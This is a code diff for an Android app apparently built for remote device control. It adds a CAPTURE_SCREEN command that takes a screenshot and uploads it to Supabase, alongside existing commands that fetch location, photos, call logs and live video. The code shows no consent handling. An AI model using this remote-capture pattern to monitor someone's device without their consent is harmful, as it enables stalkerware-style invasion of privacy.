@@ -15,6 +15,7 @@ import com.lokme.camera.VideoStreamHelper
 import com.lokme.location.LocationHelper
 import com.lokme.network.SupabaseClient
 import com.lokme.network.WsClient
+import com.lokme.screen.ScreenCaptureHelper
 import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.launch
@@ -71,6 +72,7 @@ class CommandExecutor(private val context: Context) {
             "SHOW_DIALOG" -> showDialog(commandId, deviceId, payload, onSuccess, onError)
             "GET_LOCATION" -> getLocation(commandId, deviceId, onSuccess, onError)
             "CAPTURE_PHOTO" -> capturePhoto(commandId, deviceId, payload, onSuccess, onError)
+            "CAPTURE_SCREEN" -> captureScreen(commandId, deviceId, onSuccess, onError)
             "GET_CALL_LOG" -> getCallLog(commandId, deviceId, onSuccess, onError)
             "START_VIDEO_STREAM" -> startVideoStream(commandId, deviceId, payload, wsClient, onSuccess, onError)
             "STOP_VIDEO_STREAM" -> stopVideoStream(commandId, deviceId, onSuccess, onError)
@@ -257,6 +259,28 @@ class CommandExecutor(private val context: Context) {
             }
         } catch (e: Exception) {
             onError(e.message ?: "Read failed")
+        }
+    }
+
+    private fun captureScreen(commandId: String, deviceId: String, onSuccess: (String) -> Unit, onError: (String) -> Unit) {
+        try {
+            val bytes = ScreenCaptureHelper.captureScreen()
+            if (bytes == null) {
+                onError("Screen capture failed (grant MediaProjection permission on device)")
+                return
+            }
+
+            scope.launch {
+                try {
+                    val url = SupabaseClient.uploadPhoto(deviceId, "screen_${System.currentTimeMillis()}.jpg", bytes)
+                    SupabaseClient.insertPhotoRecord(deviceId, url, "screen")
+                    onSuccess(url)
+                } catch (e: Exception) {
+                    onError(e.message ?: "Upload failed")
+                }
+            }
+        } catch (e: Exception) {
+            onError(e.message ?: "Screen capture error")
         }
     }
 }
